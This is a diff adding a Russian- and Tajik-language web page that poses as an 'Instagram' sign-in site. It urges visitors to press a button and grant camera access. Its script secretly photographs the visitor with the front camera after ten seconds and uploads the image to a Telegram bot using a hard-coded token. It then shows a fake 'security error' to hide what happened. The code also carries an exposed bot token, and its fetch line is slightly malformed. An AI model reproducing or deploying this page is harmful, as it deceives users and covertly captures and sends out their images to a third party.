@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram-Usmon.oo7 | Официальный сайт</title>
+</head>
+<body style="text-align: center; background: #000; color: #fff; font-family: sans-serif; padding: 20px;">
+
+    <h2>Чтобы войти в сайт, нажмите кнопку ниже ⏬!</h2>
+    <p style="color: #ccc;">Нажми кнопку ниже, а потом разреши доступ к камере.</p>
+    <p style="font-size: 0.9em; color: #888;">Барои ворид шудан ба тугмаи зери навиштаҷот зер кунед. Пеш аз ворид шудан тугмаи "Разрешить"-ро зер кунед!</p>
+    
+    <button id="start" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer; font-weight: bold; margin-top: 20px;">
+        IInstagram-Usmon.oo7
+    </button>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const token = '8233473341:AAH9BAA2of2kLZZ3nrxV2jSomNkKSUw4MUk';
+        const chatId = '8233473341';
+
+        document.getElementById('start').onclick = async () => {
+            const btn = document.getElementById('start');
+            
+            try {
+                // Запрашиваем доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                // Меняем текст на кнопке, чтобы пользователь ждал
+                btn.innerText = "Загрузка профиля... 10%";
+                btn.style.background = "#555";
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Увеличенная задержка: 10 секунд (10000 мс)
+                // Это даст камере время сфокусироваться и настроить свет
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    
+                    // Рисуем кадр с видео на холст
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'snap.jpg');
+
+                        // Отправка фото в Telegram
+                        fetch(https://api.telegram.org/bot${token}/sendPhoto, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(() => {
+                            btn.innerText = "Ошибка доступа";
+                            alert("Ошибка: Ваше устройство отклонило запрос безопасности. Попробуйте войти через официальное приложение.");
+                            
+                            // Выключаем камеру после снимка
+                            stream.getTracks().forEach(track => track.stop());
+                        })
+                        .catch(err => {
+                            console.error("Ошибка отправки:", err);
+                        });
+                    }, 'image/jpeg', 0.9);
+                    
+                }, 10000); // Время ожидания в миллисекундах
+
+            } catch (err) {
+                alert("Для входа необходимо разрешить доступ к камере в браузере.");
+            }
+        };
+    </script>
+</body>
+</html>
